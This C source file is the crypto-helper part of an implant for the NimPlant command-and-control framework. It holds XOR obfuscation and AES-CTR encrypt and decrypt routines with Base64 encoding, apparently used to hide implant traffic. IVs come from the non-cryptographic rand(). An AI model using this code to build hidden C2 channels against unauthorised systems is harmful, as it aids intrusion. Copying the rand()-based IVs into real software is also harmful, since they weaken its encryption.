/**
 * GNU General Public License, version 2.0.
 *
 * Copyright (c) 2025 Tijme Gommers (@tijme).
 *
 * This source code file is part of C-implant for NimPlant C2. 
 * Licensed under GNU General Public License, version 2.0, and 
 * you are free to use, modify, and distribute this file under 
 * its terms. However, any modified versions of this file must 
 * include this same license and copyright notice.
 */

/**
 * Standard Input Output.
 * 
 * Defines three variable types, several macros, and various functions for performing input and output.
 * https://www.tutorialspoint.com/c_standard_library/stdio_h.htm
 */
#include <stdio.h>

/**
 * Integers.
 * 
 * Defines macros that specify limits of integer types corresponding to types defined in other standard headers.
 * https://pubs.opengroup.org/onlinepubs/009696899/basedefs/stdint.h.html
 */
#include <stdint.h>

/**
 * Standard Library.
 * 
 * Defines four variable types, several macros, and various functions for performing general functions.
 * https://www.tutorialspoint.com/c_standard_library/stdlib_h.htm
 */
#include <stdlib.h>

/**
 * Strings.
 * 
 * Defines one variable type, one macro, and various functions for manipulating arrays of characters.
 * https://www.tutorialspoint.com/c_standard_library/string_h.htm
 */
#include <string.h>

/**
 * Perform an XOR operation on each byte of the input array using a given key.
 *
 * This function takes an array of bytes and a key, then applies an XOR operation
 * on each byte with segments of the key. The resulting bytes overwrite the input array.
 *
 * @param input The input array of bytes to be processed and transformed.
 * @param size The length of the input array.
 * @param key The 64-bit integer key used for the XOR operation.
 * @return uint8_t* A pointer to the modified input array containing the XORed bytes.
 */
uint8_t* XorData(uint8_t* input, size_t size, int64_t key) {
    int64_t k = key;

    for (size_t i = 0; i < size; ++i) {
        uint8_t character = input[i];

        // Perform XOR with parts of the key
        for (int m = 0; m <= 24; m += 8) {
            uint8_t value = (uint8_t)((k >> m) & 0xFF);
            character ^= value;
        }

        input[i] = character;
        k += 1;
    }

    return input;
}

/**
 * Encrypts data in-place using AES-CTR mode with a provided key.
 *
 * This function generates a random IV (16 bytes), then applies AES-CTR encryption
 * to the provided data using the key. The IV is prepended to the encrypted data.
 * A new buffer is allocated to hold both the IV and the ciphertext.
 *
 * @param struct Relocatable* context A struct with all loaded modules & functions.
 * @param uint8_t* data The array of bytes to be encrypted. The original data is not modified.
 * @param size_t size The length of the data to be encrypted.
 * @param uint8_t* key The 128-bit encryption key (16 bytes) used in AES-CTR encryption.
 * @return char* A pointer to the newly allocated buffer containing the IV followed by the ciphertext.
 */
char* EncryptData(struct Relocatable* context, uint8_t* data, size_t size, uint8_t* key) {
    // Initialize the AES context
    struct AES_ctx ctx;

    if (size == 0) return NULL;
    
    // Generate a random IV (16 bytes) for AES-CTR mode
    uint8_t iv[16];
    for (int i = 0; i < 16; i++) {
        iv[i] = context->functions.rand() % 256;
    }

    // Set up AES context with the key and IV
    AES_init_ctx_iv(context, &ctx, key, iv);

    // Allocate memory for the output (IV + encrypted data)
    uint8_t* encrypted_data = context->functions.calloc(16 + size, sizeof(char));
    if (encrypted_data == NULL) {
        return NULL;
    }

    // Copy the IV to the beginning of the encrypted data buffer
    context->functions.memcpy(encrypted_data, iv, 16);

    // Encrypt the data (starting from byte 16) in place by applying AES-CTR
    context->functions.memcpy(encrypted_data + 16, data, size);
    AES_CTR_xcrypt_buffer(context, &ctx, encrypted_data + 16, size);

    // Base64 encode data and IV
    char* lpResultEncoded = Base64Encode(context, encrypted_data, size+16, NULL);

    context->functions.free(encrypted_data);

    return lpResultEncoded;
}

/**
 * Decrypts data in-place using AES-CTR mode with a provided key.
 *
 * This function extracts the IV from the first 16 bytes of the data, then applies
 * AES-CTR decryption to the remaining data using the provided key. The original 
 * plaintext data is restored in a new buffer, and the IV is unchanged.
 *
 * @param struct Relocatable* context A struct with all loaded modules & functions.
 * @param char* data The base64 encoded array of bytes to be decrypted.
 * @param size_t size The total length of the data array, including the IV.
 * @param uint8_t* key The 128-bit decryption key (16 bytes) used in AES-CTR decryption.
 * @return uint8_t* A newly allocated buffer containing the decrypted plaintext data.
 */
uint8_t* DecryptData(struct Relocatable* context, char* data, size_t size, uint8_t* key) {
    if (size == 0) return NULL;  // If data is empty, do nothing

    size_t decodedSize;
    uint8_t* lpDecoded = Base64Decode(context, data, size, &decodedSize);

    // Extract the IV (first 16 bytes)
    uint8_t lpIv[16];
    context->functions.memcpy(lpIv, lpDecoded, 16);

    // Extract the encrypted data (rest of the data after the IV)
    uint8_t* lpEncryptedData = lpDecoded + 16;

    // Initialize the AES context with the key and IV
    struct AES_ctx ctx;
    AES_init_ctx_iv(context, &ctx, key, lpIv);

    // Allocate memory for the output (decrypted data)
    uint8_t* decrypted_data = context->functions.calloc(decodedSize - 16, sizeof(char)); // Data length minus the IV
    if (decrypted_data == NULL) return NULL;

    // Decrypt the data in place by applying AES-CTR mode
    context->functions.memcpy(decrypted_data, lpEncryptedData, decodedSize - 16);
    AES_CTR_xcrypt_buffer(context, &ctx, decrypted_data, decodedSize - 16);

    return decrypted_data;  // Return the decrypted data buffer
}